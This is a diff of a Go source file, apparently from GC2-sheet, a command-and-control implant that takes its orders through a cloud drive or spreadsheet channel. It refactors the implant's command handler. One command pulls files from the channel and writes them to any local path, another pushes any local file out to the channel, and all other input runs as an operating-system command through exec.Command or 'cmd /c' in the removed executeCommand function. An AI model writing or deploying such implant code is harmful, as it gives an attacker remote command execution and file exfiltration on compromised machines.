@@ -1,15 +1,14 @@
 package C2
 
 import (
-	"GC2-sheet/internal/configuration"
 	"GC2-sheet/internal/utils"
 	"fmt"
-	"os/exec"
-	"runtime"
+	"os"
+	"path/filepath"
 	"strings"
 )
 
-func commandExecution(c2 C2Operations, lastCommand *configuration.Commands) {
+func localCommandExecution(fs FileSystem, lastCommand *Command) {
 
 	commandToExecute := lastCommand.Input
 
@@ -20,16 +19,18 @@ func commandExecution(c2 C2Operations, lastCommand *configuration.Commands) {
 			fileDriveId := slittedCommand[1]
 			downloadPath := slittedCommand[2]
 			utils.LogDebug("New download command: FileId " + fileDriveId + " saving it to: " + downloadPath)
-			fileContent, downloadErr := c2.pullFile(fileDriveId)
+			fileContent, downloadErr := fs.pullFile(fileDriveId)
 			if downloadErr != nil {
 				lastCommand.Output = downloadErr.Error()
+				utils.LogDebug(downloadErr.Error())
 				return
 			} else {
 				lastCommand.Output = "File Downloaded"
 			}
-			downloadErr = safeFile(downloadPath, fileContent)
-			if downloadErr != nil {
-				lastCommand.Output = downloadErr.Error()
+			safeFiledErr := saveFile(downloadPath, fileContent)
+			if safeFiledErr != nil {
+				lastCommand.Output = safeFiledErr.Error()
+				utils.LogDebug(safeFiledErr.Error())
 				return
 			} else {
 				lastCommand.Output = "File Downloaded"
@@ -44,13 +45,24 @@ func commandExecution(c2 C2Operations, lastCommand *configuration.Commands) {
 		if len(slittedCommand) == 2 {
 			uploadFilePath := slittedCommand[1]
 			utils.LogDebug("New upload command: file path: " + uploadFilePath)
-			uploadErr := c2.pushFile(uploadFilePath)
+			fileName := filepath.Base(uploadFilePath)
+			file, fileOpenErr := os.Open(uploadFilePath)
+			if fileOpenErr != nil {
+				lastCommand.Output = fileOpenErr.Error()
+				utils.LogDebug(fileOpenErr.Error())
+				return
+			}
+			defer file.Close()
+			uploadErr := fs.pushFile(fileName, file)
 
 			if uploadErr != nil {
 				lastCommand.Output = uploadErr.Error()
-			} else {
-				lastCommand.Output = fmt.Sprintf("File Uploaded")
+				utils.LogDebug(uploadErr.Error())
+				return
 			}
+
+			lastCommand.Output = fmt.Sprintf("File Uploaded")
+
 			return
 		}
 	}
@@ -64,35 +76,4 @@ func commandExecution(c2 C2Operations, lastCommand *configuration.Commands) {
 	lastCommand.Output = executeCommand(commandToExecute)
 
 	utils.LogDebug("Execution")
-}
-
-func executeCommand(commandToExecute string) string {
-
-	var arguments []string
-	var outCommand []byte
-	var err error
-
-	splitArgs := strings.Split(commandToExecute, " ")
-	if runtime.GOOS != "windows" {
-		if len(splitArgs) > 1 {
-			// Get arguments after command Example: -la
-			arguments = splitArgs[1:]
-			// Get command without arguments Example: ls
-			commandToExecute = splitArgs[0]
-		}
-		outCommand, err = exec.Command(commandToExecute, arguments...).Output()
-	} else {
-		// For windows commands must be on the form: "cmd /c <command>" Example "cmd /C dir"
-		arguments = append(arguments, "/c")
-		arguments = append(arguments, splitArgs...)
-		outCommand, err = exec.Command("cmd", arguments...).Output()
-	}
-
-	if err != nil {
-		out := err.Error()
-		return out
-	}
-
-	out := string(outCommand)
-	return out
 }
